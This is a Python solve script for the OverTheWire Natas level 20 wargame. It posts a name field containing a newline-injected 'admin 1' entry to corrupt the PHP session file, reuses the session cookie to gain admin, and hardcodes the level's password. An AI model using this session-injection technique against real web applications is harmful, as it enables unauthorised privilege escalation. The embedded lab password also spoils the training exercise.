#! /usr/bin/python


import requests
session=requests.Session()


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
	return (f'{headers.get("Set-Cookie","Error")}')


def showheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print (f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''


#Writing the file
url='http://natas20.natas.labs.overthewire.org/index.php'
payload={"name":"admin\nadmin 1"}
response=requests.post(url,data=payload,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers
showheaders(headers)
cookie=(cleanheaders(headers).split(';')[0].split('=')[1])
print(content)

print('\n\n\n\n\n\n\n')

#Reading the file we wrote
custom_headers={"Cookie":f'PHPSESSID={cookie}'}
print(custom_headers)
url='http://natas20.natas.labs.overthewire.org/index.php'
payload={"name":"admin"}
responser=requests.post(url,headers=custom_headers,data=payload,auth=(basic_username,basic_password))
headersr=responser.headers
showheaders(headersr)
contentr=responser.text

print(contentr)



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


# flag=content
# print(flag)


#WRITEUP
#We get form telling us to login as admin
#We post a name which is assigned to $_SESSION['name']
#Here we can use admin


